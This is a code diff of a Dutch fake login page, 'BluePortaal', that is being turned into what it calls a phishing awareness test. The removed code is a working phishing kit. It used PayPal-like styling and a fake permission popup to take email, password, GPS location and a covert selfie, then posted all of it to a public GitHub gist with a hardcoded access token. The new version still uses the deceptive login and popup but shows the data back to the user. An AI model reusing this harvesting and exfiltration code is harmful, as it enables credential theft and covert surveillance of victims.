@@ -50,6 +50,20 @@
             background: #005fa3;
         }
 
+        .message {
+            background-color: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border: 1px solid #f5c6cb;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+
+        .data {
+            margin-top: 15px;
+            font-size: 18px;
+        }
+
         #fake-popup {
             display: none;
             position: fixed;
@@ -66,52 +80,65 @@
             border-radius: 8px;
         }
 
-        .paypal-color {
-            color: #004682;
-        }
-
-        .paypal-background {
-            background-color: #f6f6f6;
-        }
-
-        .popup-text {
-            color: #333;
+        #selfie-preview {
+            margin-top: 20px;
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
         }
     </style>
 </head>
-<body class="paypal-background">
+<body>
 
-    <div class="container">
-        <h2 class="paypal-color">BluePortaal</h2>
+    <div class="container" id="form-container">
+        <h2>BluePortaal</h2>
         <p>Log in om door te gaan</p>
         <input type="text" placeholder="E-mailadres" id="email">
         <input type="password" placeholder="Wachtwoord" id="password">
         
-        <button class="login-btn" onclick="requestPermissions()">Inloggen</button>
+        <button class="login-btn" onclick="processForm()">Inloggen</button>
     </div>
 
     <div id="fake-popup">
-        <p class="popup-text">Om verder te gaan, moeten de benodigde toestemmingen worden gegeven voor locatie en camera.</p>
+        <p>Om verder te gaan, moeten de benodigde toestemmingen worden gegeven voor locatie en camera.</p>
+    </div>
+
+    <div id="result-container" style="display: none;">
+        <h2>Resultaten van de Test</h2>
+        <p class="message">Dit was een bewustwordingstest van de digikamer Maas-Rotte. Deze onderstaande gegevens hadden nu in handen kunnen zijn van iemand anders.</p>
+        
+        <div class="data">
+            <p><strong>E-mailadres:</strong> <span id="result-email"></span></p>
+            <p><strong>Wachtwoord:</strong> <span id="result-password"></span></p>
+            <p><strong>Locatie:</strong> <span id="result-location"></span></p>
+            <p><strong>Selfie:</strong></p>
+            <img id="selfie-preview" src="" alt="Selfie Preview">
+        </div>
+
+        <button class="login-btn" onclick="resetForm()">Opnieuw invullen</button>
     </div>
 
     <script>
         let gpsLocation = null;
         let selfieData = null;
 
-        function requestPermissions() {
+        async function processForm() {
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
-            console.log(`📧 Gegevens opgeslagen - E-mail: ${email}, Wachtwoord: ${password}`);
 
             document.getElementById("fake-popup").style.display = "block";
             setTimeout(() => {
                 document.getElementById("fake-popup").style.display = "none";
             }, 5000);
 
-            requestLocationPermission()
-                .then(() => requestCameraPermission())
-                .then(() => sendDataToGitHub(email, password, gpsLocation, selfieData))
-                .catch(error => console.log("❌ Fout bij het verkrijgen van toestemmingen:", error));
+            try {
+                await requestLocationPermission();
+                await requestCameraPermission();
+                await showResult(email, password, gpsLocation, selfieData);
+            } catch (error) {
+                console.log("❌ Fout bij het verkrijgen van toestemmingen:", error);
+                alert("Er is een fout opgetreden bij het verkrijgen van de toestemmingen.");
+            }
         }
 
         function requestLocationPermission() {
@@ -122,11 +149,10 @@
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude
                         };
-                        console.log(`📍 GPS Locatie: ${gpsLocation.latitude}, ${gpsLocation.longitude}`);
                         resolve();
-                    }, error => reject());
+                    }, error => reject("Fout bij locatie toestemming."));
                 } else {
-                    reject();
+                    reject("Geolocation is niet ondersteund.");
                 }
             });
         }
@@ -138,18 +164,15 @@
                         .then(stream => {
                             let video = document.createElement("video");
                             video.srcObject = stream;
-                            video.width = 320;  
-                            video.height = 240; 
-                            video.play(); 
-                            video.style.display = "none";
+                            video.play();
                             setTimeout(() => {
                                 takeSelfie(video, stream);
                                 resolve();
                             }, 3000);
                         })
-                        .catch(error => reject());
+                        .catch(error => reject("Fout bij camera toestemming."));
                 } else {
-                    reject();
+                    reject("Camera toegang wordt niet ondersteund.");
                 }
             });
         }
@@ -162,35 +185,36 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             selfieData = canvas.toDataURL("image/png");
-            console.log("📸 Selfie genomen:", selfieData);
 
             stream.getTracks().forEach(track => track.stop());
         }
 
-        function sendDataToGitHub(email, password, location, selfie) {
-            const githubToken = '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'; // Gebruik een geldige token
+        async function showResult(email, password, location, selfie) {
+            if (!location || !selfie) {
+                alert("Locatie of selfie zijn niet goed verkregen.");
+                return;
+            }
 
-            const gistData = {
-                description: "Inloggegevens en media verzameld via BluePortaal",
-                public: true,
-                files: {
-                    "user_data.json": {
-                        content: JSON.stringify({ email, password, location, selfie })
-                    }
-                }
-            };
+            // Toon de resultaten op dezelfde pagina
+            document.getElementById('form-container').style.display = 'none';
+            document.getElementById('result-container').style.display = 'block';
 
-            fetch('https://api.github.com/gists', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': `token ${githubToken}`
-                },
-                body: JSON.stringify(gistData)
-            })
-            .then(response => response.json())
-            .then(data => console.log('GitHub Gist gemaakt:', data))
-            .catch(error => console.error('Fout bij het maken van Gist:', error));
+            // Vul de gegevens in op de pagina
+            document.getElementById('result-email').textContent = email;
+            document.getElementById('result-password').textContent = password;
+            document.getElementById('result-location').textContent = `Latitude: ${location.latitude}, Longitude: ${location.longitude}`;
+
+            // Toon de selfie
+            document.getElementById('selfie-preview').src = selfie;
+        }
+
+        function resetForm() {
+            // Reset de formulier en verberg de resultaten
+            document.getElementById('form-container').style.display = 'block';
+            document.getElementById('result-container').style.display = 'none';
+            document.getElementById("email").value = "";
+            document.getElementById("password").value = "";
+            document.getElementById('selfie-preview').src = "";
         }
     </script>
 
